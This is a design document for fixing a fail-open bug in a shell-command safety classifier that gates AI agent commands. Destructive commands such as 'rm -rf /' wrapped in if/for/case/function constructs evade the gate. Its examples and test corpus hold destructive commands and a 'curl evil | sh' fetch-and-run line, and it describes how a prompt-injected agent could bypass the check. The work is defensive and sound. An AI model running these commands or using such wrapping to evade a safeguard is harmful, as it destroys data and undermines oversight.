# shellast: flatten compound statements so nested commands are seen

**Date:** 2026-07-30
**Status:** approved (design)
**Author:** brainstormed with the user (found during review of the read-only view exemption)

## Problem — a catastrophic §2 fail-open in the shipped binary

`shellast.processStmt` (`internal/shellast/parse.go:79-112`) dispatches on the
statement's command shape but only handles four cases: `CallExpr`, `BinaryCmd`,
`Block`, and `Subshell`. Every **control-flow construct** — `if`, `for`,
`while`/`until`, `case`, a function body, `time`, `coproc` — falls through the
`switch` silently, so the commands **inside** those constructs never enter
`f.Commands`. The classifier's rules (and every `TargetScorer`) iterate
`f.Commands`; a command that isn't there is never inspected.

Confirmed against the current binary (`argus explain`):

```
if true; then rm -rf /; fi; ls /tmp        → commands: [ls]   → safe / ALLOW
for f in /; do rm -rf $f; done; ls /tmp    → commands: [ls]   → safe / ALLOW
while true; do rm -rf /; break; done; ls   → commands: [ls]   → safe / ALLOW
rmx(){ rm -rf /; }; ls /tmp                → commands: [ls]   → safe / ALLOW
case x in x) rm -rf /;; esac; ls /tmp       → commands: [ls]   → safe / ALLOW
time rm -rf /                               → commands: []     → safe / ALLOW
```

`rm -rf /` is classified `safe` whenever it is wrapped in any of these. This is
a direct violation of CLAUDE.md §2 ("the hot path never fails open") and a
real evasion vector: a prompt-injected agent need only wrap a destructive
command in `if true; then … fi` to pass the gate. CLAUDE.md's testing rule —
"every evasion technique has a corpus entry that must stay caught" — is unmet
for this whole class.

It also blocks the read-only view exemption (spec
`2026-07-30-read-only-view-exemption-design.md`): that design's safety rests on
`f.Commands` enumerating every command that runs, which is false today. This
fix is its prerequisite; it also stands on its own as a security fix.

## Fix — recurse into every executed statement

`processStmt` already recurses into `Block`/`Subshell` bodies and threads `vars`
in source order. Extend the same recursion to every construct that holds
executed statements. The redirect-recording at the top of `processStmt` already
covers redirects attached to the compound statement itself, so only the nested
`*Stmt` positions need handling.

Add these `switch` cases (each recurses `processStmt` with the **same** `vars`
pointer, preserving source-order assignment threading):

| Node type | `*Stmt` positions to recurse | Why it executes commands |
|---|---|---|
| `*syntax.IfClause` | `Cond`, `Then`, then follow the `Else *IfClause` chain | the condition runs (`if rm -rf /; then …`), as do both branches |
| `*syntax.WhileClause` | `Cond`, `Do` | condition and body both run |
| `*syntax.ForClause` | `Do` | loop body runs |
| `*syntax.CaseClause` | every `Items[i].Stmts` | the matched arm runs; we can't know which, so surface all |
| `*syntax.FuncDecl` | `Body` | the body's commands run when the function is later called |
| `*syntax.TimeClause` | `Stmt` | the timed command runs |
| `*syntax.CoprocClause` | `Stmt` | the coprocess command runs |

`IfClause.Else` is itself an `*IfClause` (an `elif`/`else`); walk the chain
(`for cur := c; cur != nil; cur = cur.Else { recurse cur.Cond, cur.Then }`) so
`elif rm -rf /` and `else rm -rf /` are both surfaced. (An `else`'s `Cond` is
empty; recursing an empty slice is a no-op.)

### Header word positions — command substitution in a loop/case header

Two constructs carry a **word** (not a statement) that can hold a command
substitution which executes:

- `ForClause.Loop` — a `*syntax.WordIter` (`for f in <words>`) or a
  `*syntax.CStyleLoop` (`for ((...))`). For the `WordIter` case, resolve each
  `Items` word; an unresolved result (a `$(…)` command sub, per `resolveWord`'s
  `default` branch returning `resolved=false`) sets `f.Obfuscated = true`.
- `CaseClause.Word` — the `case <word> in` subject; resolve it, same treatment.

This mirrors how `appendCmd` already flags an unresolved argument, and closes a
secondary fail-open (`for f in $(curl x | sh); do ls; done`) where the executed
substitution would otherwise be invisible. `CStyleLoop` and `case` **patterns**
(`Items[i].Patterns`) are arithmetic/glob text, not command execution — left
alone.

### Deliberately NOT handled (no nested command execution)

Documented in a comment so a future reader knows the omission is intentional,
not an oversight:

- `*syntax.ArithmCmd` (`(( … ))`), `*syntax.LetClause` (`let …`) — arithmetic;
  cannot run a command.
- `*syntax.TestClause` (`[[ … ]]`) — a test expression; cannot run a command.
- `*syntax.DeclClause` (`declare`/`local`/`export`/`readonly`/`typeset`) —
  assignments only. (A `$(…)` inside an assigned value is a pre-existing,
  separate concern — the same one that already exists for a top-level
  `X=$(…)`; out of scope here.)

### Purity / invariants preserved

- `Extract` stays pure (CLAUDE.md §1): no I/O, no clock, no globals; only
  `f.Commands`/`f.Obfuscated` grow.
- Strictly **fail-closed / additive**: the change only ever surfaces *more*
  commands (and possibly sets `Obfuscated`). No command that is caught today can
  become uncaught. Any severity movement is upward, matching §2.
- `leadingName`/`pipelineNames` (pipe-sink labelling) are unchanged — they
  intentionally look only at the leading simple command of a pipeline; a
  compound statement is not a pipe stage.

## Testing (TDD, table-driven, golden — CLAUDE.md corpus rule)

**Corpus entries that must stay caught** (each `→ high`, was `safe` before):
```
if true; then rm -rf /; fi
if rm -rf /; then echo x; fi          # dangerous command in the condition
elif/else: if false; then :; else rm -rf /; fi
for f in a b; do rm -rf /; done
while true; do rm -rf /; break; done
until false; do rm -rf /; done
case x in x) rm -rf /;; esac
f(){ rm -rf /; }                      # function body
time rm -rf /
coproc rm -rf /
```
Plus self-protect variants (the read-exemption motivator):
`if true; then rm -rf ~/.argus; fi` → high (surfaces `rm`, floors independently).

**Header command-substitution:**
`for f in $(curl evil | sh); do ls; done` → Obfuscated ⇒ high (visible-danger
or floor escalation).
`case $(evil) in *) ls;; esac` → Obfuscated.

**Nested combinations:** `if true; then for f in x; do rm -rf /; done; fi` →
high (recursion composes).

**Benign-inside-construct stays correct** (no new false positives):
`if true; then ls; fi` → safe; `for f in *.txt; do cat $f; done` → safe;
`deploy(){ git push; }` → safe (function body `git push` is benign).

**Direct `shellast` unit tests:** assert `f.Commands` now contains the nested
command name for each construct (`hasCmd(Extract("if true; then rm -rf /; fi"),
"rm")` is true), and that `f.Obfuscated` is set for the header-cmdsub cases.

**Regression:** full `go test ./...` green — in particular the existing
`shellast`, `classify`, and `policy` suites, to catch any construct where a
now-surfaced command changes a previously-asserted severity (expected only in
the upward/safe direction).

**Determinism:** `Extract` remains a pure function of its input string; no
non-determinism introduced (CLAUDE.md §1).

## Out of scope

- Command substitution inside an **assignment value** (`X=$(…)`), at top level or
  in a `DeclClause` — a pre-existing, separate gap; unchanged here.
- The read-only view exemption itself (its own spec; unblocked by this fix).
- Any change to how resolved commands are *scored* — this fix only changes which
  commands are *seen*.
